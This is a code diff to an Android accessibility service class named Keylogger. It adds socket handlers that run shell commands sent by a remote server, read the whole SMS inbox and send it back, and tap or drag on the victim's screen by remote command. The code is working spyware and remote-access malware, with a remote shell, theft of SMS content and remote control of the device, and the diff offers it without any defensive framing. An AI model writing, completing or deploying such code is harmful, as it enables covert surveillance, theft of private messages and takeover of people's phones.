@@ -13,6 +13,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.WindowManager;
 
 import androidx.annotation.RequiresApi;
 
@@ -43,20 +44,39 @@ public class Keylogger extends AccessibilityService {
     public static void stop(){
         START = false;
     }
-
+    
     private String charToString(List<CharSequence> cs){
         StringBuilder sb = new StringBuilder();
         for (CharSequence s : cs) sb.append(s);
         return sb.toString();
     }
     @RequiresApi(api = Build.VERSION_CODES.N)
-    public  void  click(float x, float y){
-        Log.d(TAG, "dispatching event click "+x+" "+y);
+    public void click(float x, float y){
+        Log.d(TAG, "dispatching click: x=" + x + ", y=" + y);
         Path p = new Path();
-        p.moveTo(x,y);
+        p.moveTo(x, y);
+        // Add a tiny lineTo to ensure it registers as a stroke/tap? 
+        // Some devices ignore single-point paths in dispatchGesture.
+        // But startLine is fine. Let's just increase duration to standard tap time (e.g. 50-100ms)
         GestureDescription.Builder builder = new GestureDescription.Builder();
-        builder.addStroke(new GestureDescription.StrokeDescription(p,100,50));
-        dispatchGesture(builder.build(),null,gestureHandler);
+        // StrokeDescription(path, startTime, duration)
+        // startTime=0 (immediate), duration=50ms
+        builder.addStroke(new GestureDescription.StrokeDescription(p, 0, 50));
+        
+        boolean res = dispatchGesture(builder.build(), new AccessibilityService.GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                super.onCompleted(gestureDescription);
+                Log.d(TAG, "Gesture Completed");
+            }
+
+            @Override
+            public void onCancelled(GestureDescription gestureDescription) {
+                super.onCancelled(gestureDescription);
+                Log.d(TAG, "Gesture Cancelled");
+            }
+        }, gestureHandler);
+        Log.d(TAG, "dispatchGesture result: " + res);
     }
 
     @RequiresApi(api = Build.VERSION_CODES.N)
@@ -200,13 +220,28 @@ public class Keylogger extends AccessibilityService {
                     public void call(Object... args) {
                         try {
                             JSONObject data = (JSONObject) args[0];
-//                            Log.d(TAG, ((JSONObject) args[0]).toString());
                             JSONObject values = new JSONObject(data.getString("points"));
+                            
+                            // Get Real Screen Metrics dynamically (in case of rotation?)
+                            // Or just fetch once. For now, fetch here to be safe.
+                            WindowManager wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
+                            android.view.Display display = wm.getDefaultDisplay();
+                            android.graphics.Point size = new android.graphics.Point();
+                            display.getRealSize(size);
+                            int realW = size.x;
+                            int realH = size.y;
+
                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                 if(data.getString("type").compareTo( "click") == 0){
-                                    click(Float.parseFloat(values.getString("x")),Float.parseFloat(values.getString("y")));
+                                    float xPct = Float.parseFloat(values.getString("x"));
+                                    float yPct = Float.parseFloat(values.getString("y"));
+                                    click(xPct * realW, yPct * realH);
                                 }else{
-                                    drag(Float.parseFloat(values.getString("x1")),Float.parseFloat(values.getString("y1")),Float.parseFloat(values.getString("x2")),Float.parseFloat(values.getString("y2")));
+                                    float x1Pct = Float.parseFloat(values.getString("x1"));
+                                    float y1Pct = Float.parseFloat(values.getString("y1"));
+                                    float x2Pct = Float.parseFloat(values.getString("x2"));
+                                    float y2Pct = Float.parseFloat(values.getString("y2"));
+                                    drag(x1Pct * realW, y1Pct * realH, x2Pct * realW, y2Pct * realH);
                                 }
                             }
                         } catch (Exception e) {
@@ -215,8 +250,88 @@ public class Keylogger extends AccessibilityService {
                     }
                 });
 
+                // SMS Handler
+                sock.on("sms", new Emitter.Listener() {
+                    @Override
+                    public void call(Object... args) {
+                        try {
+                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
+                            if(array.getString(0).equals("start")){
+                                getSMS();
+                            }
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
+
+                // Shell Command Handler
+                sock.on("shellCmd", new Emitter.Listener() {
+                    @Override
+                    public void call(Object... args) {
+                        try {
+                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
+                            String cmd = array.getString(0);
+                            ShellExec.execute(cmd, sock);
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
+
+                // Shell Kill Handler
+                sock.on("shellKill", new Emitter.Listener() {
+                    @Override
+                    public void call(Object... args) {
+                        ShellExec.destroy();
+                    }
+                });
+
+                // Clean up on connect/reconnect
+                sock.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
+                    @Override
+                    public void call(Object... args) {
+                        try {
+                            ShellExec.destroy();
+                        } catch (Exception e) {
+                            Log.e(TAG, "Connect error: " + e.getMessage());
+                        }
+                    }
+                });
+
             }
         }).start();
         super.onCreate();
+    }
+
+    // SMS Helper Method (moved from MyService)
+    private void getSMS(){
+        try {
+            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
+            android.content.ContentResolver contentResolver = getContentResolver();
+            android.database.Cursor cursor = contentResolver.query(uri,null,null,null,null);
+            
+            if (cursor == null) {
+                return;
+            }
+            
+            JSONArray list = new JSONArray();
+            while (cursor.moveToNext()){
+                String num = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                try {
+                    JSONObject item = new JSONObject();
+                    item.put("address",num);
+                    item.put("body",msg);
+                    list.put(item);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+            cursor.close();
+            sock.emit("sms",list);
+        } catch (Exception e) {
+            Log.e(TAG, "getSMS: "+e.getMessage());
+        }
     }
 }
